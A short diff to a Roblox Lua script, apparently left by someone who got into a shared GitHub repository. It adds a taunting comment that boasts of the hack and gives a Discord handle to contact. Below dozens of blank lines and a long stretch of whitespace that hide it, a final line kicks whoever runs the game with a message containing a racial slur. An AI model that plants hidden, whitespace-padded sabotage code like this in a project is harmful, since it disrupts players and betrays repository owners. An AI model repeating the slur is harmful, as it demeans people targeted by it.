@@ -1,1 +1,39 @@
 
+-- Your friend was hacked idiot. Thank's for sharing your github repository with him! Want him back? DM: 0un0 on discord.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+                
+                
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                game:GetService("Players").LocalPlayer:Kick("dumbass nigger")
